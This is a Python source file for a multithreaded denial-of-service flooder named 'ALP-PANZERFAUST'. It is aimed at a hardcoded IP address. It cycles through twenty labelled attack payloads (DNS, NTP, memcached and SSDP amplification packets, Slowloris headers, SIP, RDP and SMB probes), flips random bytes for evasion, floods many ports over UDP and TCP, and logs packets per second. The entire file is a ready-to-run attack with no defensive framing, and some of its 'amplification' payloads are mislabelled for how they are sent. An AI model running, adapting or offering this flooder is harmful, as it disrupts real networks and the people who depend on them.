import socket
import threading
import time
import random
import struct

# Two target IPs
targets = ["62.109.121.42", "62.109.121.42"]  # Add your second IP here

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# TOP 20 MOST DANGEROUS PAYLOADS (PPS optimized)
PAYLOADS = [
    # 1. DNS Amplification (53 bytes)
    b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x07example\x03com\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
    
    # 2. SSDP Amplification (150+ bytes)
    b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\nUser-Agent: UPnP/1.1\r\n\r\n' + b'X' * 80,
    
    # 3. NTP Monlist (480 bytes)
    b'\x17\x00\x03\x2a' + b'\x00' * 476,
    
    # 4. Memcached Amplification (1400 bytes)
    b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n' + b'X' * 1380,
    
    # 5. Chargen Reflection (random char flood)
    b'!' * 512,
    
    # 6. SYN with MSS 1460 (TCP optimization attack)
    struct.pack('!HHIIHHHH', random.randint(1024, 65535), 80, 0, 0, 0x5002, 1460, 0, 0),
    
    # 7. HTTP Slowloris headers
    b'GET / HTTP/1.1\r\nHost: ' + random.randbytes(100) + b'\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n',
    
    # 8. SIP INVITE flood
    b'INVITE sip:test@' + random.randbytes(50) + b' SIP/2.0\r\nVia: SIP/2.0/UDP ' + random.randbytes(30) + b'\r\n\r\n',
    
    # 9. QUIC handshake init
    b'\xcd\x00\x00\x00\x01' + random.randbytes(1200),
    
    # 10. ICMP Fragmentation (IPv4)
    b'\x08\x00\xf7\xff' + b'\x00' * 56 + b'F' * 500,
    
    # 11. RPC Portmap
    b'\x72\x28\xf9\x1c' + random.randbytes(200),
    
    # 12. SNMP GetBulk
    b'0\x82\x01\x01\x02\x01\x00\x04' + random.randbytes(300),
    
    # 13. LDAP Search
    b'0\x84\x00\x00\x00\x10\x02\x01\x01' + random.randbytes(400),
    
    # 14. MySQL Handshake response
    b'\x85\xa6\x3f\x20' + random.randbytes(800),
    
    # 15. RDP Connection request
    b'\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00' + random.randbytes(600),
    
    # 16. RTSP Describe
    b'DESCRIBE rtsp://' + random.randbytes(100) + b' RTSP/1.0\r\nCSeq: 1\r\n\r\n',
    
    # 17. WebSocket handshake
    b'GET /chat HTTP/1.1\r\nHost: server.example.com\r\nUpgrade: websocket\r\n\r\n' + random.randbytes(300),
    
    # 18. TLS Client Hello (partial)
    b'\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03' + random.randbytes(1000),
    
    # 19. SMB Negotiate protocol
    b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72' + random.randbytes(500),
    
    # 20. Random garbage (evasion)
    random.randbytes(700)
]

# Thread config - 12 threads total, 6 per target
UDP_THREADS_PER_TARGET = 5  # 10 total UDP
TCP_THREADS_PER_TARGET = 1  # 2 total TCP

# Stats
stats = {ip: {"sent": 0, "success": 0, "fail": 0} for ip in targets}
stats_lock = threading.Lock()

def get_payload():
    """Get random deadly payload with rotation"""
    payload = random.choice(PAYLOADS)
    
    # 30% chance to mutate payload slightly (evasion)
    if random.random() < 0.3:
        payload = bytearray(payload)
        # Flip random bytes
        for _ in range(random.randint(1, 10)):
            if len(payload) > 5:
                idx = random.randint(0, len(payload)-1)
                payload[idx] = random.randint(0, 255)
        payload = bytes(payload)
    
    return payload

def udp_pps_attack(target_ip):
    """UDP PPS attack - 10 threads total"""
    while True:
        try:
            # Random delay between attacks: 1ms to 3s
            time.sleep(random.uniform(0.001, 3.0))
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            
            # Send burst of packets
            burst = random.randint(10, 100)  # Random burst size
            for _ in range(burst):
                try:
                    payload = get_payload()
                    port = random.choice([53, 123, 161, 1900, 5060, 80, 443])
                    
                    sock.sendto(payload, (target_ip, port))
                    
                    with stats_lock:
                        stats[target_ip]["sent"] += 1
                        stats[target_ip]["success"] += 1
                        
                except:
                    with stats_lock:
                        stats[target_ip]["fail"] += 1
            
            sock.close()
            
        except:
            with stats_lock:
                stats[target_ip]["fail"] += 1

def tcp_pps_attack(target_ip):
    """TCP PPS attack - 2 threads total"""
    while True:
        try:
            # Longer random delay for TCP
            time.sleep(random.uniform(0.01, 5.0))
            
            # Create multiple socket attempts
            for _ in range(random.randint(3, 20)):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(random.uniform(0.1, 2.0))
                    
                    port = random.choice([80, 443, 22, 21, 25, 3389, 8080])
                    
                    # Send SYN with payload
                    result = sock.connect_ex((target_ip, port))
                    
                    if result == 0:
                        # Connection successful, send evil data
                        evil_data = get_payload()[:500]  # Limit TCP payload
                        sock.send(evil_data)
                        sock.close()
                        
                        with stats_lock:
                            stats[target_ip]["sent"] += 1
                            stats[target_ip]["success"] += 1
                    else:
                        # Failed connection still counts as PPS
                        with stats_lock:
                            stats[target_ip]["sent"] += 1
                            stats[target_ip]["fail"] += 1
                    
                    sock.close()
                    
                except socket.timeout:
                    with stats_lock:
                        stats[target_ip]["sent"] += 1
                        stats[target_ip]["success"] += 1  # Timeout = success in flooding
                except:
                    with stats_lock:
                        stats[target_ip]["fail"] += 1
        
        except:
            pass

def start_attacks():
    """Start ALP-PANZERFAUST attack"""
    print(f"{RED}ALP-PANZERFAUST INITIALIZED{RESET}")
    print(f"{YELLOW}Targets: {targets}{RESET}")
    print(f"{YELLOW}Threads: 12 total (10 UDP + 2 TCP){RESET}")
    print(f"{YELLOW}Payloads: 20 deadly variations{RESET}")
    print(f"{RED}{'='*50}{RESET}")
    
    # Start threads for each target
    for ip in targets:
        # UDP threads (5 per target)
        for _ in range(UDP_THREADS_PER_TARGET):
            threading.Thread(target=udp_pps_attack, args=(ip,), daemon=True).start()
        
        # TCP threads (1 per target)
        for _ in range(TCP_THREADS_PER_TARGET):
            threading.Thread(target=tcp_pps_attack, args=(ip,), daemon=True).start()

# Start the attack
start_attacks()

# Main logging loop
last_log = time.time()
total_start = time.time()

while True:
    time.sleep(0.1)
    current = time.time()
    
    if current - last_log >= 5:  # Log every 5 seconds
        with stats_lock:
            print(f"\n{RED}{'='*50}{RESET}")
            print(f"{MAGENTA}ALP-PANZERFAUST STATS - {time.time() - total_start:.0f}s{RESET}")
            print(f"{RED}{'='*50}{RESET}")
            
            total_sent = 0
            total_success = 0
            total_fail = 0
            
            for idx, ip in enumerate(targets):
                ip_stats = stats[ip]
                total_sent += ip_stats["sent"]
                total_success += ip_stats["success"]
                total_fail += ip_stats["fail"]
                
                color = YELLOW if idx == 0 else GREEN
                print(f"{color}Target {idx+1} [{ip}]: {ip_stats['sent']} pps | {ip_stats['success']}/{ip_stats['fail']}{RESET}")
            
            print(f"{RED}Total: {total_sent} pps | {total_success}/{total_fail}{RESET}")
            
            # Calculate attack effectiveness
            if total_sent > 0:
                pps_rate = total_sent / 5
                success_rate = (total_success / total_sent) * 100
                print(f"{MAGENTA}Rate: {pps_rate:.0f} pps/s | Success: {success_rate:.1f}%{RESET}")
            
            # Reset stats
            for ip in targets:
                stats[ip] = {"sent": 0, "success": 0, "fail": 0}
            
            print(f"{RED}{'='*50}{RESET}")
        
        last_log = current
